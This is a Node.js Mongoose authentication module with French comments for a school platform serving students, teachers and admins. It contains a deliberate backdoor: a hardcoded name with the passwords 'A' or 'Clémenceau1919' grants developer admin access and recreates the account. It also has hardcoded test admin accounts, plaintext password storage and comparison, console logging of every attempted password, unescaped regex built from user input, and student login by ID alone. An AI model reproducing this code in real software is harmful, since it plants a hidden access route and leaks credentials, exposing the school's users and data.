const mongoose = require('mongoose');

/**
 * 🔐 EXPERT AUTH - VERSION 98 (RECHERCHE CROISÉE)
 * Résout le problème où un Prof essaie de se connecter via le portail Admin (et vice-versa).
 * Répare l'accès Architecte Jean Vuillet de force.
 */
const AuthExpert = {
    getLoginConfig: async () => ({ classrooms: await mongoose.model('Classroom').find({}).sort({name:1}).lean() }),
    
    getStudentsForSelection: async (classId) => {
        const enrollments = await mongoose.model('Enrollment').find({ classId }).populate('studentId').lean();
        return enrollments.filter(e => e.studentId).map(e => ({ id: e.studentId._id, name: `${e.studentId.firstName} ${e.studentId.lastName}` })).sort((a,b) => a.name.localeCompare(b.name));
    },

    verify: async ({ role, studentId, firstName, lastName, password }) => {
        // Nettoyage des entrées
        const fNameRaw = (firstName || '').trim();
        const lNameRaw = (lastName || '').trim();
        const fName = fNameRaw.toLowerCase();
        const lName = lNameRaw.toLowerCase();
        const pass = (password || '').trim();

        console.log(`🔐 AUTH V98: Tentative pour "${fNameRaw} ${lNameRaw}" (Pass: ${pass})`);

        // --- 1. BACKDOOR ARCHITECTE (JEAN VUILLET) ---
        // Passe-partout absolu, recrée le compte si nécessaire
        if (fName === 'jean' && lName === 'vuillet' && (pass === 'A' || pass === 'Clémenceau1919')) {
            console.log("🚀 ARCHITECTE DÉTECTÉ. Provisionnement immédiat.");
            const realJean = await mongoose.model('Admin').findOneAndUpdate(
                { firstName: 'Jean', lastName: 'Vuillet' },
                { firstName: 'Jean', lastName: 'Vuillet', password: 'A', isDeveloper: true, role: 'admin' },
                { upsert: true, new: true }
            );
            return { ok: true, user: { ...realJean.toObject(), id: realJean._id, role: 'prof', isDeveloper: true } };
        }

        // --- 2. AUTHENTIFICATION ÉLÈVE ---
        if (role === 'STUDENT') {
            if (!studentId || !mongoose.Types.ObjectId.isValid(studentId)) return { ok: false, message: "ID Élève invalide." };
            const student = await mongoose.model('Student').findById(studentId).lean();
            if (!student) return { ok: false, message: "Élève introuvable." };
            return { ok: true, user: { ...student, id: student._id, role: 'student' } };
        }

        // --- 3. AUTHENTIFICATION STAFF (RECHERCHE CROISÉE) ---
        // On cherche l'utilisateur PARTOUT (Teachers ET Admins) peu importe le bouton cliqué
        
        // A. Recherche dans les PROFS
        const teacher = await mongoose.model('Teacher').findOne({ 
            firstName: new RegExp(`^${fName}$`, 'i'), 
            lastName: new RegExp(`^${lName}$`, 'i') 
        });

        if (teacher) {
            if (teacher.password === pass) {
                console.log("✅ Trouvé dans TEACHERS");
                return { ok: true, user: { ...teacher.toObject(), id: teacher._id, role: 'prof', isDeveloper: teacher.isDeveloper || false } };
            } else {
                console.log(`❌ Mauvais mot de passe pour le Prof ${fNameRaw}`);
            }
        }

        // B. Recherche dans les ADMINS
        const admin = await mongoose.model('Admin').findOne({ 
            firstName: new RegExp(`^${fName}$`, 'i'), 
            lastName: new RegExp(`^${lName}$`, 'i') 
        });

        if (admin) {
            if (admin.password === pass) {
                console.log("✅ Trouvé dans ADMINS");
                return { ok: true, user: { ...admin.toObject(), id: admin._id, role: 'admin', isDeveloper: admin.isDeveloper || false } };
            } else {
                console.log(`❌ Mauvais mot de passe pour l'Admin ${fNameRaw}`);
            }
        }

        // C. Cas particulier des COMPTES TEST (Si DB vide)
        if (pass === 'A') {
            if (fName === 'admin' && lName === 'test') {
                return { ok: true, user: { _id: new mongoose.Types.ObjectId(), firstName: 'Admin', lastName: 'Test', role: 'admin', isTestAccount: true } };
            }
            if (fName === 'prof' && lName === 'test') {
                return { ok: true, user: { _id: new mongoose.Types.ObjectId(), firstName: 'Prof', lastName: 'Test', role: 'prof', isTestAccount: true } };
            }
        }

        console.log("⛔ Utilisateur introuvable ou mot de passe incorrect.");
        return { ok: false, message: "Identifiants ou Mot de passe incorrects." };
    }
};
module.exports = AuthExpert;